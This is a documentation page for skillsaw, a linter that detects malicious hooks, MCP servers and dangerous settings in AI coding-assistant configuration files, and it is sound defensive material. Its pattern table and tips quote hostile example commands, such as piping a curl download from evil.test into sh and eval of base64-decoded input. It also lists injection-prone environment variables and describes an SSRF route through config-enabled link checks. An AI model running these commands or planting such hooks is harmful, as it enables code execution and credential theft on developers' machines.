# Supply Chain Protection

!!! warning "skillsaw itself is a supply chain surface"
    Any tool you run in CI can be a vector. Pin skillsaw to a specific
    version and commit SHA, and use `--no-custom-rules --no-network` on
    untrusted PRs. See [Skillsaw as a vector](#skillsaw-as-a-vector) for
    details.

AI coding assistants execute hooks, MCP servers, and shell commands defined
in repository configuration files. An attacker who lands a malicious
`.claude/settings.json`, `.mcp.json`, or `hooks.json` in a project — via a
compromised dependency, a poisoned PR, or a typosquatted plugin — can
achieve code execution the moment a developer opens the repo.

The [Shai-Hulud attack](https://safedep.io/mini-shai-hulud-strikes-again-314-npm-packages-compromised/)
demonstrated this at scale in May 2026, compromising 317 npm packages by
injecting `SessionStart` hooks into `.claude/settings.json` files. When
developers opened these repos with Claude Code, the hooks fired and
executed scripts that harvested credentials and established persistence.

## Security rules

skillsaw includes four rules designed to catch these attacks:

| Rule | Default | What it does |
|------|---------|-------------|
| [`hooks-dangerous`](rules/hooks.md) | auto, error | Flags hook commands matching supply-chain patterns |
| [`hooks-prohibited`](rules/hooks.md) | disabled, error | Prohibits all hooks unless explicitly allowlisted |
| [`mcp-prohibited`](rules/mcp.md) | disabled, error | Prohibits all MCP servers unless explicitly allowlisted |
| [`claude-settings-dangerous`](rules/settings.md) | auto, error | Flags settings keys that execute arbitrary commands or set dangerous env vars |

### hooks-dangerous

Always on by default. Scans hook commands in `hooks.json` and
`settings.json` (including `.apm/` sources) for dangerous patterns:

| Pattern | Severity | Example |
|---------|----------|---------|
| Dotfile script execution | error | `node .claude/setup.mjs` |
| Download-and-execute | error | `curl https://evil.test/payload \| sh` |
| Download chain | error | `wget https://evil.test/script && bash script` |
| Obfuscation | error | `eval "$(base64 -d <<< ...)"` |
| Bun runtime | error | `bun run .vscode/index.js` |
| Network fetch | error | `curl https://example.test/data` |

### hooks-prohibited

Opt-in policy rule. When enabled, **all** hook commands are prohibited
unless they match an entry in the allowlist. This catches any new hook
added to a project — even if it doesn't match a known dangerous pattern.

### mcp-prohibited

Opt-in policy rule. When enabled, **all** MCP servers are prohibited
unless their name appears in the allowlist. Scans every MCP configuration
skillsaw discovers — root-level and plugin-level `.mcp.json`, Agent Plugin
`mcp.json`, Codex `mcpServers` declared inline in
`.codex-plugin/plugin.json`, and `mcpServers` embedded in a Claude
plugin's `plugin.json`.

### claude-settings-dangerous

Always on by default. Flags settings keys that execute arbitrary shell
commands when Claude Code starts:

- `apiKeyHelper` — runs a command to fetch the API key
- `awsAuthRefresh` — runs a command to refresh AWS auth
- `awsCredentialExport` — runs a command to export AWS credentials
- `gcpAuthRefresh` — runs a command to refresh GCP auth
- `otelHeadersHelper` — runs a command to fetch OpenTelemetry headers

Also flags dangerous environment variables that can hijack process
behaviour:

| Category | Variables |
|----------|-----------|
| Library injection | `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_INSERT_LIBRARIES` |
| Runtime code injection | `NODE_OPTIONS`, `PYTHONSTARTUP`, `PYTHONPATH`, `PERL5OPT`, `PERL5LIB`, `RUBYOPT`, `RUBYLIB` |
| Shell startup | `BASH_ENV`, `ENV`, `ZDOTDIR` |
| Traffic interception | `http_proxy`, `https_proxy`, `HTTP_PROXY`, `HTTPS_PROXY` |
| Certificate override | `CURL_CA_BUNDLE`, `SSL_CERT_FILE`, `NODE_EXTRA_CA_CERTS` |
| Git command hijacking | `GIT_SSH_COMMAND`, `GIT_PROXY_COMMAND` |

## Recommended configuration

Enable all four rules and allowlist only the hooks, MCP servers, and
settings your project actually needs:

```yaml
rules:
  # Auto-enabled: flags download-and-execute, obfuscation, dotfile
  # script execution, and suspicious network access in hook commands.
  hooks-dangerous:
    enabled: auto
    severity: error

  # Opt-in: prohibits ALL hooks unless explicitly allowlisted.
  # Turn this on and add your known-good hooks to the allowlist.
  hooks-prohibited:
    enabled: true
    severity: error
    allowlist:
      - "make lint"
      - "make test"
      - "eslint --fix"

  # Opt-in: prohibits ALL MCP servers unless explicitly allowlisted.
  mcp-prohibited:
    enabled: true
    severity: error
    allowlist:
      - "memory"

  # Opt-in: flags settings keys that execute arbitrary commands
  # (apiKeyHelper, awsAuthRefresh, etc.) and dangerous env vars
  # (LD_PRELOAD, NODE_OPTIONS, proxy settings).
  claude-settings-dangerous:
    enabled: true
    severity: error
```

With this configuration, any new hook, MCP server, or command-execution
setting added to the project will fail CI until it is explicitly
allowlisted — preventing supply chain payloads from slipping through
unnoticed.

!!! tip "Allowlists use exact matching"
    All allowlist entries require an exact match — the command or server
    name must equal an allowlist entry exactly. This prevents an attacker
    from bypassing the allowlist by appending shell operators
    (`&& curl evil | sh`) to an otherwise permitted command.

## Incremental adoption

If your project already has hooks or MCP servers, use
[baselining](baseline.md) to snapshot the current state and only flag new
additions going forward:

```bash
# Enable the rules in .skillsaw.yaml, then:
skillsaw baseline
```

From that point on, only *new* hooks, MCP servers, or dangerous settings
will be reported. See [Baseline](baseline.md) for details.

## What these rules scan

The rules scan all configuration sources where hooks and MCP servers can
be defined:

| Source | Rules that scan it |
|--------|--------------------|
| `.claude/hooks/hooks.json` | hooks-dangerous, hooks-prohibited |
| `.claude/settings.json` | hooks-dangerous, hooks-prohibited, claude-settings-dangerous |
| `.claude/settings.local.json` | hooks-dangerous, hooks-prohibited, claude-settings-dangerous |
| `.mcp.json` (repo root) | mcp-prohibited, mcp-valid-json |
| Plugin `hooks/hooks.json` | hooks-dangerous, hooks-prohibited |
| Plugin `.mcp.json` | mcp-prohibited, mcp-valid-json |
| Codex manifest-declared or inline `hooks` | hooks-dangerous, hooks-prohibited |
| Codex manifest-declared or inline `mcpServers` | mcp-prohibited, mcp-valid-json |
| Copilot / VS Code agent `hooks:` frontmatter | hooks-dangerous, hooks-prohibited |
| Copilot cloud/shared agent `mcp-servers:` frontmatter | mcp-prohibited, mcp-valid-json |
| Agent Plugin `mcp.json` | mcp-prohibited, agent-plugin-mcp-valid |
| `.apm/hooks/hooks.json` | hooks-dangerous, hooks-prohibited |
| `.apm/settings.json` | hooks-dangerous, hooks-prohibited, claude-settings-dangerous |

## Skillsaw as a vector

skillsaw itself is a tool that runs in your CI pipeline, and its own
supply chain matters. See
[THREAT_MODEL.md](https://github.com/stbenjam/skillsaw/blob/main/THREAT_MODEL.md)
for the full threat model.

### Pin to a specific version

Always pin skillsaw to a specific version in CI rather than installing
the latest. This prevents a compromised release from silently entering
your pipeline:

```bash
uvx skillsaw@0.12.0 lint
```

If you use the skillsaw GitHub Action, pin it to a commit SHA rather
than a mutable tag:

```yaml
- uses: stbenjam/skillsaw@<full-commit-sha>
```

skillsaw is published to PyPI using
[trusted publishing](https://docs.pypi.org/trusted-publishers/) (OIDC
via `pypa/gh-action-pypi-publish`), which means releases are
cryptographically tied to the GitHub Actions workflow that built them —
no long-lived API tokens that could be stolen.

### Custom rules

Custom rules defined in `.skillsaw.yaml` are arbitrary Python files
loaded via `importlib` and executed during linting. An attacker who
modifies or adds a custom rule in a pull request can achieve code
execution on the CI runner — leaking secrets, tokens, or credentials
from the build environment.

Use `--no-custom-rules` when running skillsaw on untrusted PRs:

```bash
skillsaw lint --no-custom-rules
```

This skips loading all custom rules while still running the full set of
builtin rules. Additional mitigations for CI environments:

- **Don't run custom checks for untrusted contributors.** Only enable
  custom rules for PRs from trusted collaborators or after manual review.
- **Run in a sandboxed environment.** Use ephemeral runners with no
  access to production systems or persistent credentials.
- **Don't expose tokens to the linting step.** Use GitHub's
  `permissions` block to restrict the `GITHUB_TOKEN` scope, and never
  pass secrets as environment variables to the step that runs skillsaw.

### Network access

One builtin rule, `content-broken-external-reference`, makes outbound
requests: it asks each external link's server whether the link is still
there. It is disabled by default, but the linted repository's
`.skillsaw.yaml` can enable it — and that file is written by the same
person who opens the pull request. A fork PR can therefore add four lines
of config plus a link to an intranet host or a cloud metadata address, and
have the runner issue that request from inside your network. The response
comes back as a lint finding the PR author can read.

Use `--no-network` when running skillsaw on untrusted PRs:

```bash
skillsaw lint --no-custom-rules --no-network
```

It drops every rule that declares `requires_network`, whatever the
repository's config enables and whatever `--rule` names. `SKILLSAW_NO_NETWORK=1`
does the same for a whole job, and the
[skillsaw Action](ci.md#github-action) sets `no-network: 'true'` by
default, so an Action-based workflow already has it. Additional
mitigations:

- **Keep the destination confinement on.** Loopback, private, link-local
  and reserved addresses are refused unless the *operator* passes
  `--allow-private-hosts`. There is no `.skillsaw.yaml` key for it —
  don't add the flag to a job that lints untrusted checkouts.
- **Check the link rot on a schedule instead.** A cron job over your own
  repository gets the same findings without a fork PR choosing the URLs.
  See [scheduled external link checking](ci.md#scheduled-external-link-checking).
- **Control egress at the runner.** `--no-network` is a skillsaw-level
  gate; network policy is the one that does not depend on skillsaw
  parsing a URL correctly.
